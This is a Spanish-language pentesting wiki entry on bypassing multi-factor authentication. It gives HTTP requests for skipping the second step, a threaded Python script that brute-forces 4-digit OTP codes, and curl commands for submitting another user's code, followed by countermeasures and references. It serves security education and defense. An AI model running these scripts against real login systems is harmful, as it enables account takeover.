---
title: Bypass de Autenticación Multi-Factor (MFA / 2FA)
slug: explotacion-mfa-bypass
aliases: [MFA bypass, 2FA bypass, multi-factor bypass, two-factor bypass, OTP bypass, TOTP bypass, broken auth state, auth state confusion, intermediate session bypass, pending-2FA bypass, skip second factor, broken authentication, broken MFA logic, response manipulation 2FA]
fase: [Explotación]
plataforma: Web
dificultad: Intermedia
mitre: [T1556.006]
related: [explotacion-brute-force-advanced, explotacion-jwt, explotacion-auth-bypass-oauth]
learning_refs: [portswigger/2fa-simple-bypass]
---

# Bypass de Autenticación Multi-Factor (MFA / 2FA)

## Descripción
La autenticación multi-factor (MFA, en su variante más común 2FA con código OTP por email/SMS/app autenticadora) busca añadir un segundo paso de verificación tras el password. El bypass de MFA explota fallos en cómo el server modela el **estado de autenticación** durante el flujo multi-paso. Errores típicos: marcar la sesión como totalmente autenticada tras el paso 1 sin esperar el código, permitir saltar el paso de verificación navegando directamente a endpoints sensibles, brute-force del código OTP por falta de rate-limit, fugarse de la lógica de cambio de usuario entre pasos, o manipular respuestas/cookies que el server confía como confirmación del segundo factor. La consecuencia es acceso a la cuenta sin necesidad del segundo factor, anulando el valor de seguridad del MFA.

## Categorías de bypass

- **Estado de auth mal modelado**: la sesión post-paso-1 no distingue entre "credenciales validadas, esperando 2FA" y "completamente autenticado". El cliente navega a `/my-account` con esa sesión y el server lo deja entrar.
- **2FA enforce sólo en frontend**: redirect a `/login2`, JavaScript que bloquea navegación, mensaje "verifica tu código primero". Todo UX, no enforcement real.
- **Brute-force del código OTP**: el código es de 4-6 dígitos (10⁴ a 10⁶ candidatos). Sin rate-limit, captcha o lockout, brute-force termina en minutos.
- **Cambio de usuario entre pasos**: paso 1 con cuenta A, paso 2 con sesión de A pero submitir el código de B. Si el server no liga código a sesión correctamente, escalada de cuenta.
- **Manipulación de respuesta del paso 2**: si la lógica del cliente confía en una respuesta JSON tipo `{"verified": true}`, MITM o tampering puede forzarla.
- **Reenvío de código viejo o bypass por reenviar paso 1**: si los códigos no expiran o se acumulan, atacante captura uno de un flujo anterior.
- **Respuesta differential**: igual que en username enumeration, si el server responde distinto cuando el OTP es válido vs inválido (length, status, timing), el atacante automatiza.

## Herramientas
- **Burp Suite (Repeater + Intruder)** — manipulación de request/response, brute-force de códigos OTP cuando no hay rate-limit.
- **Burp Turbo Intruder** — útil cuando hay que probar 10⁶ códigos rápido y Burp Community no escala.
- **`curl` o scripts Python con `requests`** — automatización de flujos multi-paso con manejo de cookies de sesión entre pasos.
- **Browser DevTools** — inspección de cookies y storage para identificar variables de estado del flujo MFA.

## Comandos / Ejemplos

### Bypass por navegación directa post-paso-1 (auth state)
```http
POST /login HTTP/2
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=carlos&password=montoya
```
Respuesta: `302 Location: /login2` + `Set-Cookie: session=...`. Con esa cookie, **sin completar `/login2`**:
```http
GET /my-account?id=carlos HTTP/2
Host: target.com
Cookie: session=<value-recibido-en-paso-1>
```
Si la respuesta es 200 con el panel de cuenta, el server marcó la sesión como autenticada tras paso 1.

### Brute-force de código OTP (4 dígitos, sin rate-limit)
```python
import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()
# Auth paso 1 primero, asumir cookie ya seteada
def try_code(code):
    r = session.post('https://target.com/login2', data={'mfa-code': f'{code:04d}'},
                     allow_redirects=False)
    return code, r.status_code, len(r.content)

with ThreadPoolExecutor(max_workers=20) as ex:
    for code, status, length in ex.map(try_code, range(10000)):
        if status == 302:
            print(f'OTP valido: {code:04d}')
            break
```

### Cambio de usuario entre pasos (con curl)
```bash
# paso 1 con la cuenta del atacante
curl -i -X POST https://target.com/login -d 'username=attacker&password=pwd' -c cookies.txt

# paso 2 con la cookie del atacante pero el código del legítimo (interceptado de algún lado)
curl -i -X POST https://target.com/login2 -d 'mfa-code=1234' -b cookies.txt
# si el server no liga el código al user de la sesión, sino solo valida que el OTP existe en su BD,
# el atacante entra como legitimo
```

## Contramedidas
- **Modelar la sesión con estado intermedio**: tras paso 1 marcar `stage=pending_otp`, no `authenticated`. Middleware de endpoints sensibles exige `stage=authenticated`. Tras OTP correcto, rotar session ID y promover stage.
- **Enforcement server-side, no cliente-side**: ningún redirect, JS o flag de UI debe ser la única defensa. Validar en cada request server-side.
- **Rate limiting del OTP**: 5 intentos por sesión + lockout temporal. El espacio de búsqueda del OTP es chico, sin rate limit el brute-force es trivial.
- **Ligar el OTP a la sesión**: el código debe estar emitido para una sesión específica, no globalmente. Validar `(session_id, otp)` como pair, rechazar si la sesión no matchea la del paso 1.
- **OTPs con expiración corta** (60-300s) y de un solo uso. Tras consumirse o expirar, invalidar.
- **Rotación de session ID** tras completar el segundo factor (anti session-fixation).
- **Logging y alertas**: múltiples intentos OTP fallidos, ratio inusual de stages incompletos, accesos a recursos sensibles desde sesiones en stage intermedio.
- **Hardware tokens (FIDO2/WebAuthn)** en lugar de OTPs por email/SMS cuando la criticidad lo amerita. Inmunes a phishing y brute-force del código.

## Referencias
- PortSwigger Web Security Academy. (s.f.). *Multi-factor authentication*. https://portswigger.net/web-security/authentication/multi-factor
- OWASP Foundation. (s.f.). *Authentication Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- OWASP Foundation. (s.f.). *Multifactor Authentication Cheat Sheet*. https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html
- MITRE Corporation. (2024). *ATT&CK Technique T1556.006: Modify Authentication Process - Multi-Factor Authentication*. https://attack.mitre.org/techniques/T1556/006/
- MITRE Corporation. (2024). *CWE-287: Improper Authentication*. https://cwe.mitre.org/data/definitions/287.html
- MITRE Corporation. (2024). *CWE-307: Improper Restriction of Excessive Authentication Attempts*. https://cwe.mitre.org/data/definitions/307.html
- Stuttard, D., & Pinto, M. (2011). *The Web Application Hacker's Handbook* (2nd ed.). Wiley. Cap. 6 (Attacking Authentication).
- NIST. (2017). *SP 800-63B: Digital Identity Guidelines - Authentication and Lifecycle Management*. https://pages.nist.gov/800-63-3/sp800-63b.html
